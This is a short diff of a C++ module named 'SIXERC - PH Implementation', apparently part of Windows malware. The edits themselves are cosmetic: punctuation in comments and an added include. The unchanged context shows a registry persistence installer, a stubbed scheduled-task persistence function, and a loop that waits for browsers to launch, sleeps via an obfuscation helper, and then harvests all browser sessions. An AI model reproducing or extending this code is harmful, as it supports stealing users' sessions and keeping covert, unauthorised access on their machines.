@@ -1,5 +1,5 @@
 // ============================================================================
-// SIXERC — PH Implementation
+// SIXERC - PH Implementation
 // ============================================================================
 
 #include "modules/ph.hpp"
@@ -12,6 +12,7 @@
 #include <string>
 #include <thread>
 #include <chrono>
+#include <map>
 #include <tlhelp32.h>
 
 namespace sixerc::ph {
@@ -27,7 +28,7 @@ bool install_registry_persistence(const std::wstring& exe_path) {
 }
 
 bool install_task_persistence(const std::wstring& exe_path) {
-    // Uses COM interface for scheduled tasks — simplified version
+    // Uses COM interface for scheduled tasks - simplified version
     // For production, use ITaskService COM interface
     return false;
 }
@@ -48,7 +49,7 @@ void monitor_browser_sessions() {
             bool running = utils::is_process_running(name);
             
             if (running && !was_running[name]) {
-                // Browser just started — wait for it to settle then harvest
+                // Browser just started - wait for it to settle then harvest
                 obf::stealth_sleep(5000);
                 
                 auto sessions = bps::harvest_all_sessions();
